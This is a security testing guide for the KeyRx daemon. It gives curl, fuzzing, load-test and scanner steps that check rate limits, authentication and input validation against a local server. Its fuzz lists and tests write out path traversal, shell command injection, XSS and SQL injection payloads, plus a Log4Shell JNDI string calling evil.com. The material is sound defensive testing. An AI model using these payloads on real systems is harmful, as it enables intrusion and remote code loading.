# Security Testing Guide

This guide provides instructions for testing the security hardening implementations in KeyRx daemon.

## Prerequisites

```bash
# Install testing tools
cargo install cargo-tarpaulin  # Coverage
pip install locust             # Load testing
```

## 1. Unit Tests

### Rate Limiting Tests

```bash
# Run rate limit tests
cargo test --package keyrx_daemon middleware::rate_limit

# Expected tests:
# ✅ test_rate_limit_basic - Basic 3-request limit
# ✅ test_rate_limit_different_ips - IP isolation
# ✅ test_rate_limit_window_reset - Time window reset
# ✅ test_login_rate_limit - 3 login attempts limit
# ✅ test_ws_connection_limit - 10 WebSocket connections
# ✅ test_login_limit_window_reset - Login window reset
```

### Input Validation Tests

```bash
# Run input validation tests
cargo test --package keyrx_daemon middleware::input_validation

# Expected tests:
# ✅ test_path_traversal_detection - ../etc/passwd blocked
# ✅ test_command_injection_detection - Shell metacharacters blocked
# ✅ test_validate_profile_name - Alphanumeric + dash/underscore only
# ✅ test_validate_file_size - File size limits enforced
```

### Security Middleware Tests

```bash
# Run security layer tests
cargo test --package keyrx_daemon middleware::security

# Expected tests:
# ✅ test_contains_path_traversal
# ✅ test_validate_path_traversal
# ✅ test_sanitize_html - XSS prevention
```

### Authentication Tests

```bash
# Run authentication tests
cargo test --package keyrx_daemon middleware::auth

# Expected tests:
# ✅ test_dev_mode_allows_all
# ✅ test_password_mode_requires_auth
# ✅ test_health_endpoint_always_allowed
```

## 2. Integration Tests

### Test Server Setup

```bash
# Start test daemon in background
KEYRX_ADMIN_PASSWORD=test123 cargo run --bin keyrx_daemon -- run &
TEST_PID=$!

# Wait for server to start
sleep 2
```

### Rate Limiting Tests

```bash
# Test general API rate limit (100/minute)
echo "Testing general API rate limit..."
for i in {1..105}; do
  curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080/api/health
done | tail -10
# Expected: Last 5 requests should return 429

# Test login rate limit (5/minute)
echo "Testing login rate limit..."
for i in {1..7}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "Authorization: Bearer wrong" \
    http://localhost:8080/api/profiles
done
# Expected: Last 2 requests should return 429

# Cleanup
kill $TEST_PID
```

### Path Traversal Tests

```bash
# Test path traversal in URL
curl -v http://localhost:8080/api/profiles/../../../etc/passwd
# Expected: 400 Bad Request

# Test URL-encoded traversal
curl -v http://localhost:8080/api/profiles/%2e%2e/%2e%2e/etc/passwd
# Expected: 400 Bad Request

# Test double-encoded traversal
curl -v http://localhost:8080/api/profiles/%252e%252e/etc/passwd
# Expected: 400 Bad Request
```

### Command Injection Tests

```bash
# Test semicolon injection
curl -v -H "X-Test: test;ls" http://localhost:8080/api/health
# Expected: 400 Bad Request (header rejected)

# Test pipe injection
curl -v http://localhost:8080/api/profiles -d '{"name":"test|cat"}'
# Expected: 400 Bad Request (profile name validation)

# Test backtick injection
curl -v http://localhost:8080/api/profiles -d '{"name":"test\`whoami\`"}'
# Expected: 400 Bad Request
```

### File Upload Size Tests

```bash
# Create large file (11 MB)
dd if=/dev/zero of=/tmp/large.bin bs=1M count=11

# Test upload size limit
curl -v -F "file=@/tmp/large.bin" http://localhost:8080/api/profiles/test/upload
# Expected: 413 Payload Too Large

# Create acceptable file (1 MB)
dd if=/dev/zero of=/tmp/small.bin bs=1M count=1

# Test acceptable upload
curl -v -F "file=@/tmp/small.bin" http://localhost:8080/api/profiles/test/upload
# Expected: 200 OK (or 401 if auth required)

# Cleanup
rm /tmp/large.bin /tmp/small.bin
```

### XSS Prevention Tests

```bash
# Test XSS in profile name
curl -v -X POST http://localhost:8080/api/profiles \
  -H "Content-Type: application/json" \
  -d '{"name":"<script>alert(\"XSS\")</script>"}'
# Expected: 400 Bad Request (profile name validation)

# Test XSS in configuration content
curl -v -X POST http://localhost:8080/api/config \
  -H "Content-Type: application/json" \
  -d '{"content":"<img src=x onerror=alert(\"XSS\")>"}'
# Expected: Content should be escaped when displayed
```

### Authentication Tests

```bash
# Test without auth (should fail if password set)
curl -v http://localhost:8080/api/profiles
# Expected: 401 Unauthorized (if KEYRX_ADMIN_PASSWORD is set)

# Test with wrong password
curl -v -H "Authorization: Bearer wrong" http://localhost:8080/api/profiles
# Expected: 401 Unauthorized

# Test with correct password
curl -v -H "Authorization: Bearer test123" http://localhost:8080/api/profiles
# Expected: 200 OK

# Test health endpoint (should always work)
curl -v http://localhost:8080/health
# Expected: 200 OK (no auth required)
```

## 3. Load Testing

### Locust Load Test

Create `locustfile.py`:

```python
from locust import HttpUser, task, between

class KeyRxUser(HttpUser):
    wait_time = between(0.1, 0.5)

    @task(10)
    def health_check(self):
        self.client.get("/health")

    @task(5)
    def get_profiles(self):
        self.client.get("/api/profiles",
                       headers={"Authorization": "Bearer test123"})

    @task(3)
    def get_devices(self):
        self.client.get("/api/devices",
                       headers={"Authorization": "Bearer test123"})

    @task(1)
    def try_path_traversal(self):
        # Should be blocked
        self.client.get("/api/profiles/../../../etc/passwd")
```

Run load test:

```bash
# Start daemon
KEYRX_ADMIN_PASSWORD=test123 cargo run --bin keyrx_daemon -- run &

# Run locust
locust -f locustfile.py --host=http://localhost:8080 --users=50 --spawn-rate=10 --run-time=60s --headless

# Expected:
# - Most requests succeed (200)
# - Some hit rate limits (429)
# - Path traversal attempts all fail (400)
# - No 500 errors
```

## 4. Automated Security Scanning

### OWASP ZAP Scan

```bash
# Pull ZAP Docker image
docker pull zaproxy/zap-stable

# Run baseline scan
docker run -t zaproxy/zap-stable zap-baseline.py \
  -t http://host.docker.internal:8080 \
  -r zap_report.html

# Expected: No high/critical vulnerabilities
```

### Nikto Scan

```bash
# Run Nikto web scanner
nikto -h localhost:8080 -o nikto_report.txt

# Review report for:
# - No directory traversal vulnerabilities
# - No command injection vectors
# - No XSS vulnerabilities
```

## 5. Fuzzing Tests

### URL Fuzzing

```bash
# Create fuzz payloads file
cat > fuzz_payloads.txt <<EOF
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..;/..;/..;/etc/passwd
....//....//....//etc/passwd
;ls
|cat /etc/passwd
\`whoami\`
\$(id)
<script>alert(1)</script>
<img src=x onerror=alert(1)>
' OR '1'='1
" OR "1"="1
${jndi:ldap://evil.com/a}
EOF

# Test each payload
while IFS= read -r payload; do
  echo "Testing: $payload"
  curl -s -o /dev/null -w "Status: %{http_code}\n" \
    "http://localhost:8080/api/profiles/$payload"
done < fuzz_payloads.txt

# Expected: All should return 400 or 404 (not 200 or 500)
```

### Header Fuzzing

```bash
# Test header injection
for header in "X-Test: test;ls" "X-Test: test|cat" "X-Test: test\`id\`"; do
  echo "Testing header: $header"
  curl -s -o /dev/null -w "Status: %{http_code}\n" \
    -H "$header" \
    http://localhost:8080/api/health
done

# Expected: 400 Bad Request for injections
```

## 6. Performance Impact Testing

### Baseline Performance (No Security)

```bash
# Benchmark without middleware
ab -n 10000 -c 100 http://localhost:8080/health

# Record:
# - Requests/sec
# - Time per request (mean)
# - Transfer rate
```

### Performance with Security

```bash
# Benchmark with all security middleware
ab -n 10000 -c 100 http://localhost:8080/health

# Compare to baseline:
# - Overhead should be < 5%
# - No failed requests
```

## 7. WebSocket Security Tests

### Connection Limit Test

```bash
# Create WebSocket test script
cat > ws_test.py <<EOF
import asyncio
import websockets

async def connect():
    try:
        async with websockets.connect('ws://localhost:8080/ws') as ws:
            await asyncio.sleep(60)  # Hold connection
    except Exception as e:
        print(f"Connection failed: {e}")

async def main():
    # Try to open 15 connections (limit is 10)
    tasks = [connect() for _ in range(15)]
    await asyncio.gather(*tasks)

asyncio.run(main())
EOF

# Run test
python ws_test.py

# Expected: First 10 succeed, last 5 fail with 429
```

## 8. Security Regression Tests

Add to CI/CD pipeline:

```yaml
# .github/workflows/security-tests.yml
name: Security Tests

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run security unit tests
        run: |
          cargo test --package keyrx_daemon middleware::rate_limit
          cargo test --package keyrx_daemon middleware::input_validation
          cargo test --package keyrx_daemon middleware::security
          cargo test --package keyrx_daemon middleware::auth

      - name: Run cargo audit
        run: cargo audit

      - name: Run clippy security lints
        run: cargo clippy -- -D warnings
```

## 9. Expected Results Summary

| Test Category | Expected Pass Rate | Critical Failures |
|--------------|-------------------|-------------------|
| Unit Tests | 100% | 0 |
| Rate Limiting | 100% | 0 |
| Path Traversal Prevention | 100% | 0 |
| Command Injection Prevention | 100% | 0 |
| File Upload Limits | 100% | 0 |
| Authentication | 100% | 0 |
| XSS Prevention | 100% | 0 |
| Load Tests | ≥95% | < 5 |
| OWASP ZAP Scan | No High/Critical | 0 |

## 10. Troubleshooting

### Rate Limit False Positives

If legitimate traffic hits rate limits:

```bash
# Increase limits in config
export KEYRX_RATE_LIMIT_GENERAL=200  # Default: 100/min
export KEYRX_RATE_LIMIT_LOGIN=10     # Default: 5/min
```

### WebSocket Connection Issues

If WebSocket connections fail:

```bash
# Check connection count
curl http://localhost:8080/api/metrics | jq '.websockets.connections'

# Adjust limit if needed
export KEYRX_WS_MAX_CONNECTIONS=20  # Default: 10
```

### Performance Degradation

If security middleware causes slowdowns:

```bash
# Profile middleware overhead
cargo flamegraph --package keyrx_daemon --bin keyrx_daemon -- run

# Optimize hot paths identified in flamegraph
```

## 11. Reporting Security Issues

If you discover a security vulnerability:

1. **DO NOT** create a public GitHub issue
2. Email security@keyrx.dev with:
   - Vulnerability description
   - Steps to reproduce
   - Potential impact
   - Suggested fix (optional)
3. Wait for acknowledgment (within 48 hours)
4. Follow responsible disclosure timeline

## References

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP ZAP Documentation](https://www.zaproxy.org/docs/)
- [Locust Documentation](https://docs.locust.io/)
- [Nikto Documentation](https://github.com/sullo/nikto/wiki)
